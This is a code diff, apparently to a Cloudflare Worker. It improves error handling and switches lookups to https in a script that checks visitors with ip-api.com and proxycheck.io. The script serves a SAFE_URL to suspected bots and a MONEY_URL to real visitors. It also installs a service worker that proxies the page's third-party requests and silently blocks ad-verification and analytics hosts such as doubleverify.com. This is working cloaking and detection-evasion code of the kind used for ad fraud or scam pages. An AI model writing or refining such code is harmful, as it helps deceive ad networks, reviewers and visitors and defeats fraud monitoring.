@@ -764,7 +764,7 @@ async function handleRequest(request) {
 
   // ROUTE 1: Serve the service worker script itself when the browser requests it.
   if (url.pathname === '/service-worker.js') {
-    const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const proxyUrl = \\\`\\\${selfOrigin}proxy-resource/\\\${encodeURIComponent(url.href)}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
+    const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const proxyUrl = \\\`/proxy-resource/\\\${encodeURIComponent(url.href)}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
     return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
   }
 
@@ -790,7 +790,7 @@ async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
 
   // Step 1: Basic Geo/ISP Check (ip-api.com)
-  const ipApiUrl = \`http://ip-api.com/json/\${clientIP}?fields=countryCode,isp\`;
+  const ipApiUrl = \`https://ip-api.com/json/\${clientIP}?fields=countryCode,isp\`;
   const ipApiResponse = await fetch(ipApiUrl);
   if (ipApiResponse.ok) {
     const ipApiData = await ipApiResponse.json();
@@ -800,7 +800,7 @@ async function isVisitorABot(request) {
   }
 
   // Step 2: Professional Fraud Check (proxycheck)
-  const apiUrl = \`http://proxycheck.io/v2/\${clientIP}?key=YOUR_PROXYCHECK_API_KEY_HERE&vpn=1\`;
+  const apiUrl = \`https://proxycheck.io/v2/\${clientIP}?key=YOUR_PROXYCHECK_API_KEY_HERE&vpn=1\`;
   
   const response = await fetch(apiUrl);
   if (!response.ok) return true; // Fail safe (block)
@@ -816,6 +816,12 @@ async function handleMainRequest(request) {
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
     const response = await fetch(targetUrl, request);
+    
+    // Check if upstream request was successful
+    if (!response.ok) {
+      return new Response(\`Upstream error (\${response.status})\`, { status: 502 });
+    }
+    
     const rewriter = new HTMLRewriter()
       .on('head', new HeadRewriter())
       .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(new URL(request.url).hostname, new URL(targetUrl).origin));
@@ -828,21 +834,31 @@ async function handleMainRequest(request) {
 
 // Proxies all other resources (CSS, JS, images, fonts).
 async function handleResourceRequest(request) {
-  const resourceUrl = decodeURIComponent(new URL(request.url).pathname.replace('/proxy-resource/', ''));
-  const resourceRequest = new Request(resourceUrl, request);
-  const response = await fetch(resourceRequest);
-  let newResponse = new Response(response.body, response);
-  
-  // Set CORS headers
-  newResponse.headers.set('Access-Control-Allow-Origin', '*');
-  
-  // Preserve original MIME type
-  const contentType = response.headers.get('Content-Type');
-  if (contentType) {
-    newResponse.headers.set('Content-Type', contentType);
+  try {
+    const resourceUrl = decodeURIComponent(new URL(request.url).pathname.replace('/proxy-resource/', ''));
+    const resourceRequest = new Request(resourceUrl, request);
+    const response = await fetch(resourceRequest);
+    
+    // Check if resource request was successful
+    if (!response.ok) {
+      return new Response(\`Resource not found (\${response.status})\`, { status: response.status });
+    }
+    
+    let newResponse = new Response(response.body, response);
+    
+    // Set CORS headers
+    newResponse.headers.set('Access-Control-Allow-Origin', '*');
+    
+    // Preserve original MIME type
+    const contentType = response.headers.get('Content-Type');
+    if (contentType) {
+      newResponse.headers.set('Content-Type', contentType);
+    }
+    
+    return newResponse;
+  } catch (error) {
+    return new Response('Resource fetch failed', { status: 502 });
   }
-  
-  return newResponse;
 }
 
 // Rewrites URLs in HTML attributes.
